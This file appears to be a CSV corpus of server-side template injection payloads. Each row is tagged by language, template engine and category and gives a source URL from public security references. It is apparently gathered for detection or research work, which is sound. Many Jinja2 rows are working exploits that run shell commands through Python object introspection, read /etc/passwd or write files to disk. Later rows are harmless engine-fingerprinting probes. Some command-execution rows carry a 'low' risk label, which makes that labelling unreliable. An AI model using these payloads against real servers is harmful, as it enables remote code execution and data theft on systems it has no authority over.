"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.mro()[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
# Without '{{' and '}}',#without'S'and'S',python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x()._module.__builtins__['S']('S').popen(request.args.input).read()}}{%endif%}{%endfor%}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}","{{dict.mro()[-N].__subclasses__()[N](request.args.cmd,shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(1) %},{%print(N)%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 7*7 == 49 %}OK{% endif %},{%ifN*N==N%}ok{%endif%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 7*7 == 50 %}BAD{% else %}ELSE{% endif %},{%ifN*N==N%}bad{%else%}else{%endif%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% set x = 7*7 %}{{ x }},{%setx=N*N%}{{x}},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% for i in range(3) %}{{ i }}{% endfor %},{%foriinrange(N)%}{{i}}{%endfor%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = ''.__class__ %}{{ a }}{% endwith %},{%witha='S'.__class__%}{{a}}{%endwith%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(''.__class__.__mro__[1]) %},{%print('S'.__class__.__mro__[N])%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with x = ''.__class__.__mro__[1].__subclasses__()|length %}{{ x }}{% endwith %},{%withx='S'.__class__.__mro__[N].__subclasses__()|length%}{{x}}{%endwith%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""id"").read() %}{{ a }}{% endwith %}","{%witha=config.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read()%}{{a}}{%endwith%}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% if config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""id"").read().startswith(""uid="") %}yes{% endif %}","{%ifconfig.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read().startswith(""S"")%}yes{%endif%}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(lipsum) %},{%print(lipsum)%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(cycler) %},{%print(cycler)%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(joiner) %},{%print(joiner)%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(namespace) %},{%print(namespace)%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 'os' in lipsum.__globals__ %}OS_OK{% endif %},{%if'S'inlipsum.__globals__%}os_ok{%endif%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if cycler.__init__.__globals__ %}G_OK{% endif %},{%ifcycler.__init__.__globals__%}g_ok{%endif%},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(lipsum.__globals__['os'].popen('id').read()) %},{%print(lipsum.__globals__['S'].popen('S').read())%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{ x }}{% endwith %},{%withx=lipsum.__globals__['S'].popen('S').read()%}{{x}}{%endwith%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(cycler.__init__.__globals__['os'].popen('id').read()) %},{%print(cycler.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(joiner.__init__.__globals__['os'].popen('id').read()) %},{%print(joiner.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(namespace.__init__.__globals__['os'].popen('id').read()) %},{%print(namespace.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %},{%if'S'inlipsum.__globals__['S'].popen('S').read()%},python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% endif %},{%endif%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params","http://localhost:N/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_#formattingthestringfromgetparams",python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,http://localhost:N/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{'<script>alert(1);</script>'}},{{'S'}},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{'<script>alert(1);</script>'|safe}},{{'S'|safe}},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ request.__class__.__dict__ }},{{request.__class__.__dict__}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ config.__class__.__dict__ }},{{config.__class__.__dict__}},python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ request.__class__._load_form_data.__globals__.__builtins__.open(""/etc/passwd"").read() }}","{{request.__class__._load_form_data.__globals__.__builtins__.open(""S"").read()}}",python,Jinja2,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read()}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar[""__globals__""][""__builtins__""][""__import__""](""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar[""S""][""S""][""S""](""S"").popen(""S"").read()}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ (config|attr(""__class__"")).from_envvar[""__globals__""][""__builtins__""][""__import__""](""os"").popen(""ls"").read() }}","{{(config|attr(""S"")).from_envvar[""S""][""S""][""S""](""S"").popen(""S"").read()}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% with a = request[""application""][""\x5f\x5fglobals\x5f\x5f""][""\x5f\x5fbuiltins\x5f\x5f""][""\x5f\x5fimport\x5f\x5f""](""os"")[""popen""](""ls"")[""read""]() %} {{ a }} {% endwith %}","{%witha=request[""S""][""S""][""S""][""S""](""S"")[""S""](""S"")[""S""]()%}{{a}}{%endwith%}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar.__globals__.import_string(""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar.__globals__.import_string(""S"").popen(""S"").read()}}",python,Jinja2,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with %},{%with%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if %},{%if%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% for %},{%for%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% set %},{%set%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print %},{%print%},python,Jinja2,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{concat(""${"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{"", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""<%="", ""{{first}}*{{second}}"", ""%>"")}}","{{concat(""S"",""S"",""S"")}}",ruby,ERB,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{{"", ""{{first}}*{{second}}"", ""}}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""${{"", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""#{"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",ruby,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""[["", ""{{first}}*{{second}}"", ""]]"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{="", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""[[${"", ""{{first}}*{{second}}"", ""}]]"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""${xyz|"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""#set($x="", ""{{first}}*{{second}}"", "")${x}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""@("", ""{{first}}*{{second}}"", "")"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{@"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{ssti}},{{ssti}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{result}},{{result}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{payload}},{{payload}},javascript,Angular,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/csti/angular-client-side-template-injection.yaml
$<%-1-%>,$<%-N-%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""&lt;%-1-%&gt;""}","${""S""}",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""&lt;%-1-%>""}","${""S""}",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""1""}","${""S""}",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""<%-1-%>""}","${""S""}",ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
${&quot;&lt;%-1-%&gt;&quot;},${&quot;&lt;%-N-%&gt;&quot;},java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%'#{@},&lt;%'#{@},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%=1%&gt;#{2},&lt;%=N%&gt;#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%=1%&gt;@*#{1},&lt;%=N%&gt;@*#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%=1%>@*#{1},&lt;%=N%>@*#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%{{#{%&gt;},&lt;%{{#{%&gt;},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##1{{!--{{1}}--}}-->*/#},//*<!--{##N{{!--{{N}}--}}-->*/#},multi,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>-->*/#},//*<!--{##<%=N%>-->*/#},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>--}}-->*/#},//*<!--{##<%=N%>--}}-->*/#},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>-}}-->*/#},//*<!--{##<%=N%>-}}-->*/#},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#},//*<!--{##<%=N%>{{!--{{N}}--}}-->*/#},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
1#{2}{{a}},N#{N}{{a}},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
1@*#{1},N@*#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"38/52 error, 2/52 modified, length 13. It behaves identical to ${{<%[%'""}}%\. Unknown creator.","N/Nerror,N/Nmodified,lengthN.itbehavesidenticalto${{<%[%'""}}%\.unknowncreator.",ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!-- /*<!--{##<%=1%>{{!--{{1}}--}}-->*/#} -->,<!--/*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}-->,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!--*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}-->,<!--*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}-->,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!--[-->//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}<!--]-->,<!--[-->//*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}<!--]-->,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<#set($x<%= with almost everything before appended until (inclusive) <#set($x<%={{={@{#{${xux}}%>),<#set($x<%=withalmosteverythingbeforeappendeduntil(inclusive)<#set($x<%={{={@{#{${xux}}%>),ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<#set($x<%=%>),<#set($x<%=%>),ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
